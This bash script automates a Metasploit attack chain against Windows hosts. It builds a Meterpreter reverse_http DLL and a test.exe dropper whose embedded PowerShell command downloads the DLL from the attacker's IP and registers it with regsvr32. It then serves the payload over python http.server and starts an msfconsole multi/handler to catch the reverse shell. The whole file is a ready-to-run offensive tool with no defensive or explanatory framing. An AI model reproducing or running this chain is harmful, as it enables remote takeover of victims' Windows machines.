#!/bin/bash

function pause(){
	read -s -n 1 -p "Press [ENTER] key to continue .."
	echo ""
}

read ip
read port

#Reverse_HTTP Shell

echo "BE AWARE, PORT MUST BE CHANGED AFTER EVERY USE"
msfvenom -p windows/meterpreter/reverse_http LHOST=$ip LPORT=$port -f dll > test-cmd.dll

sleep 10 & 

#Creates Windows Test.exe

msfvenom -a x86 --platform Windows -p windows/exec cmd="powershell wget http://$ip:8000/test-cmd.dll -outfile test-cmd.dll; powershell regsvr32.exe C:\users\UserA\downloads\test-cmd.dll" -f exe > test.exe

sleep 10 &

gnome-terminal -e "python3 -m http.server"

pause 'Press [ENTER] key to continue ..' 


msfconsole -q -x "use exploit/multi/handler; set LHOST $ip; set LPORT $port; set PAYLOAD windows/meterpreter/reverse_http; set ExitOnSession false; exploit -j"
